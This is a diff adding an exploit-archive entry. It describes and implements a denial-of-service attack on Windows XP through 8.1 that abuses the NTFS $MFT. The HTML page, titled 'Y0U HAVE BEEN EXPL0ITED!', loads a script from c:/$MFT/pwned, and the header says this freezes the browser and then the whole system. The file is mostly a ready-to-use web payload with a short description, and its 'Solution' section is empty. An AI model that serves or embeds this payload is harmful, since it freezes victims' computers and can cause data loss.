@@ -1,0 +1,26 @@
+<!--
+# Exploit Title: NTFS 3.1 Master File Table DoS Exploit
+# Date: 6\23\17
+# Exploit Author: EagleWire
+# Version: Windows XP/7/8/8.1
+# Tested on: Windows XP/7/8/8.1
+1. Description:
+This exploits a vulnerability in Windows XP to Windows 8.1. The master file table, or MFT, is a hidden file in the NTFS file system. It maps out all files in the drive. It is supposed to be protected from any user access because all files that use NTFS have a reference to it. If the directory is recreated, the system will lock the file until the next reboot. Therefore, for example, when trying to create a file or read the volume of files, NTFS attempts to seize ERESOURCE $ MFT file and will hang at this stage forever.
+2. Exploit:
+The exploit tries to access a nonexistant file c:/$MFT/pwned. The browser will hang then stop responding, then after the browser exists, the rest of the system becomes unresponsive.
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="stylesheet.css">
+    <meta charset="utf-8" />
+    <title>Y0U HAVE BEEN EXPL0ITED!</title>  
+</head>
+  <body>
+    <script src="c:/$MFT/pwned"></script>
+  </body>
+</html>
+
+<!--
+3: Solution:
+-->
